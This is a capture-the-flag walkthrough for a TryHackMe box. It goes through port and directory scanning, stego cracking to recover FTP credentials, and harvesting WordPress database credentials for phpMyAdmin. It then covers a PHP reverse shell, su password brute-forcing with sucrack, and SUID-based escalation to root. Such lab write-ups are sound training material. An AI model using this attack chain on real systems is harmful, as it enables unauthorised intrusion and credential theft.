# Diffrent CTF

### Task 1 Basic scan
can be done with nmap and gobuster

###### Nmap scan

`$ nmap -vv -p- IPADDR`

    Discovered open port 80/tcp on 10.10.228.110
    Discovered open port 21/tcp on 10.10.228.110
    PORT   STATE SERVICE REASON
    21/tcp open  ftp     syn-ack
    80/tcp open  http    syn-ack


###### gobuster result

`$ gobuster dir -u http://IPADDR -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 30`

    /wp-content           (Status: 301) [Size: 319] [--> http://10.10.228.110/wp-content/]
    /a[REDACTED]       (Status: 301) [Size: 322] [--> http://10.10.228.110/a[REDACTED]/]
    /wp-includes          (Status: 301) [Size: 320] [--> http://10.10.228.110/wp-includes/]  
    /javascript           (Status: 301) [Size: 319] [--> http://10.10.228.110/javascript/]   
    /wp-admin             (Status: 301) [Size: 317] [--> http://10.10.228.110/wp-admin/]     
    /phpmyadmin           (Status: 301) [Size: 319] [--> http://10.10.228.110/phpmyadmin/] 


### Task 2 Localhost
`http://IPADDR/a[REDACTED]`

[![/a](https://i.imgur.com/KGz41yt.png "/a")](https://i.imgur.com/KGz41yt.png "/a")

now we have a image and wordlist looks like a job for stegcracker
password was at the eof took some time to crack

`$ stegcracker austrailian-bulldog-ant.jpg wordlist.txt`

    Successfully cracked file with password: [REDACTED]
    Tried 49--- passwords
    Your file has been written to: austrailian-bulldog-ant.jpg.out
    [REDACTED]

`$ cat austrailian-bulldog-ant.jpg.out `

    RlRQL[REDACTED]nRwClBBU1M6IDEyM2FkYW5hY3JhY2s=

`$ cat austrailian-bulldog-ant.jpg.out  | base64 -d`

    FTP-LOGIN
    USER: hakanftp
    PASS: 123[REDACTED]

`$ ftp IPADDR`

    ftp> ls -la
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    drwxrwxrwx    8 1001     1001         4096 Jan 15 12:26 .
    drwxrwxrwx    8 1001     1001         4096 Jan 15 12:26 ..
    -rw-------    1 1001     1001           88 Jan 13 11:06 .bash_history
    drwx------    2 1001     1001         4096 Jan 11 10:29 .cache
    drwx------    3 1001     1001         4096 Jan 11 10:29 .gnupg
    -rw-r--r--    1 1001     1001          554 Jan 10 22:26 .htaccess
    drwxr-xr-x    2 0        0            4096 Jan 14 16:49 announcements
    -rw-r--r--    1 1001     1001          405 Feb 06  2020 index.php
    -rw-r--r--    1 1001     1001        19915 Feb 12  2020 license.txt
    -rw-r--r--    1 1001     1001         7278 Jun 26  2020 readme.html
    -rw-r--r--    1 1001     1001         7101 Jul 28  2020 wp-activate.php
    drwxr-xr-x    9 1001     1001         4096 Dec 08 22:13 wp-admin
    -rw-r--r--    1 1001     1001          351 Feb 06  2020 wp-blog-header.php
    -rw-r--r--    1 1001     1001         2328 Oct 08  2020 wp-comments-post.php
    -rw-r--r--    1 0        0            3194 Jan 11 09:55 wp-config.php
    drwxr-xr-x    4 1001     1001         4096 Dec 08 22:13 wp-content
    -rw-r--r--    1 1001     1001         3939 Jul 30  2020 wp-cron.php
    drwxr-xr-x   25 1001     1001        12288 Dec 08 22:13 wp-includes
    -rw-r--r--    1 1001     1001         2496 Feb 06  2020 wp-links-opml.php
    -rw-r--r--    1 1001     1001         3300 Feb 06  2020 wp-load.php
    -rw-r--r--    1 1001     1001        49831 Nov 09 10:53 wp-login.php
    -rw-r--r--    1 1001     1001         8509 Apr 14  2020 wp-mail.php
    -rw-r--r--    1 1001     1001        20975 Nov 12 14:43 wp-settings.php
    -rw-r--r--    1 1001     1001        31337 Sep 30  2020 wp-signup.php
    -rw-r--r--    1 1001     1001         4747 Oct 08  2020 wp-trackback.php
    -rw-r--r--    1 1001     1001         3236 Jun 08  2020 xmlrpc.php
    226 Directory send OK.
    ftp> 

[Click to download php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php "Click to download php reverse shell")

[i used my own php shell click to go github page](https://github.com/rootkral4/phpreverseshell "i used my own php shell click to go github page")

i tried to upload php shell but server responded with 404
so download and read wp-config.php

` $ head -n 40 wp-config.php`

    define( 'DB_NAME', 'phpmyadmin1' );
    
    /** MySQL database username */
    define( 'DB_USER', 'phpmyadmin' );
    
    /** MySQL database password */
    define( 'DB_PASSWORD', '[REDACTED]' );
    
    /** MySQL hostname */
    define( 'DB_HOST', 'localhost' );
    
    /** Database Charset to use in creating database tables. */
    define( 'DB_CHARSET', 'utf8mb4' );
    
    /** The Database Collate type. Don't change this if in doubt. */
    define( 'DB_COLLATE', '' );


`http://IPADDR/phpmyadmin`

logged in via creds in wp-config.php

[![](https://i.imgur.com/5Wjx7Zr.png)](https://i.imgur.com/5Wjx7Zr.png)

there is 2 phpmyadmin db
phpmyadmin1 -> wp_options -> site_url was a subdomain

`$ nano /etc/hosts` //add subdomain to hosts

`http://subdomain.adana.thm/`

this subdomain was same as main website
when i move to /phpshell.php, yes! php shell is here
got reverse shell finally

    remote@machine$ cd ..
    remote@machine$ cd html
    remote@machine$ cat wwe3bbfla4g.txt
    THM{343a7[REDACTED]c346edff}

then i searched for suid files nad found this one but others has no execute perm

    -rwxr-x--- 1 root hakanbey 238080 Nov  5  2017 /usr/bin/find

In this case, we know that we need to switch to the hakanbey user. Due to the similarity of stego and ftp passwords, the password of the hakanbey user can also be in this format.
123adana is prefix for passwords, created a wordlist(used wordlist.txt on ftp) with this prefix
after that i sent sucrack to remote machine 

`remote@machine$ dpkg -x sucrack_1.2.3-5+b1_amd64.deb sucrack`

`remote@machine$ sucrack -w 100 -b 500 -u hakanbey wordlist.txt`

after short period of time sucrack was succed

`remote@machine$ su hakanbey`

    THM{8ba9d7[REDACTED]d00e67127} //user flag

`remote@machine$ find / -perm -4000 -type f 2>/dev/null` // scanning for suid again

    /usr/bin/binary

`remote@machine$ ltrace ./binary`

    strcat("***", "****")                                                                                    = "******"
    strcat("******", "**")                                                                                  = "********"
    strcat("*********", "***")                                                                               = "************"
    strcat("************", "**")                                                                             = "*************"
    printf("I think you should enter the cor"...)                                                            = 52
    __isoc99_scanf(0x561c5b518edd, 0x7fff99056ac0, 0, 0I think you should enter the correct string here ==>^C <no return ...>
    --- SIGINT (Interrupt) ---
    +++ killed by SIGINT +++

got string

`remote@machine$ ./binary`

    I think you should enter the correct string here ==>w*************
    Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/root.jpg (CyberChef)
    
    Copy /root/root.jpg ==> /home/hakanbey/root.jpg

    00000000  FF D8 FF E0  00 10 4A 46   49 46 00 01  01 01 00 60                                                                                             ......JFIF.....`
    00000010  00 60 00 00  FF E1 00 78   45 78 69 66  00 00 4D 4D                                                                                             .`.....xExif..MM
    00000020  ** ** ** **  ** ** ** **   ** ** ** **  ** ** ** **                        // hint points this line                                                                     ...=y._..m..i..u
    00000030  00 00 00 56  03 01 00 05   00 00 00 01  00 00 00 68                                                                                             ...V...........h
    00000040  03 03 00 01  00 00 00 01   00 00 00 00  51 10 00 01                                                                                             ............Q...
    00000050  00 00 00 01  01 00 00 00   51 11 00 04  00 00 00 01                                                                                             ........Q.......
    00000060  00 00 0E C4  51 12 00 04   00 00 00 01  00 00 0E C4                                                                                             ....Q...........
    00000070  00 00 00 00  41 64 6F 62   65 20 49 6D  61 67 65 52                                                                                             ....Adobe ImageR
    00000080  65 61 64 79  00 00 00 01   86 A0 00 00  B1 8F FF DB                                                                                             eady............
    00000090  00 43 00 02  01 01 02 01   01 02 02 02  02 02 02 02                                                                                             .C..............
    000000A0  02 03 05 03  03 03 03 03   06 04 04 03  05 07 06 07                                                                                             ................

`https://cyberchef.com`

From HEX > To Base85
    root:[REDACTED]

`remote@machine$ su root`

    THM{c5a9d3[REDACTED]4466a6c}
